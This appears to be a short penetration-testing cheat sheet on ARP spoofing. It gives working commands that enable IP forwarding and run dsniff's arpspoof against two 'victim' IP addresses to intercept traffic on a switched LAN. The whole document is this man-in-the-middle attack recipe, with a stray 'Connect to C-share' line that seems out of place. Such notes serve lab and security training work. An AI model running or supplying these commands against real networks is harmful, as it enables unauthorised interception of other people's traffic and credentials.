# Arp-spoof

Using the Dsniff collection of tools, specifically arpspoof, we can intercept packets on a switched LAN

## Router

To make sure traffic gets forwarded to the actual targets, we have to configure Linux to act as a router:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Run arpspoof

Connect to C-share:

```bash
arpspoof -i <interface> -t <target> -r <host>
```

* <interface> is the network interface to use when intercepting
* <target> and <host> are victim IP's

Example:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
```